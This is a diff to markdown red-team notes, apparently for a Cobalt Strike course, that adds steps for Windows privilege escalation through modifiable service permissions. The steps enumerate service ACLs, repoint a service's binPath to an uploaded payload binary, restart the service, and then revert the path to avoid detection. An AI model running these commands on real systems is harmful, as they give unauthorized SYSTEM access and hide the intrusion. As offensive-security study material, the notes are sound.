@@ -52,7 +52,27 @@ execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit Modifiab
 After that, use [this](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/) powershell script to enumerate the service further:
 ```powershell
 powershell-import C:\Tools\Get-ServiceAcl.ps1
-powershell Get-ServiceAcl -Name <VulnService2> | select -expand Access
+powershell Get-ServiceAcl -Name <VulnService> | select -expand Access
 ```
+Check ServiceRights and IdentityReference to see who can do what.
+If you have the rights, for instance, you can change the default binary path to an arbitrary file.
+Check the current Binary Path:
+```powershell
+run sc qc <VulnService>
+```
+Then upload the binary (remember it must be a <span style="color:red">.svc.exe</span>) and reconfigure the path:
+```powershell
+run sc config <VulnService> binPath= <C:\Temp\tcp-local_x64.svc.exe>
+```
+Recheck the path and restart the service:
+```powershel
+run sc qc <VulnService>
+run sc stop VulnService
+run sc start VulnService
+```
+Rec-hange the binary path at the end to avoid detection.
+&nbsp;
 
-
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Weak Service Binary Permissions</b></span>
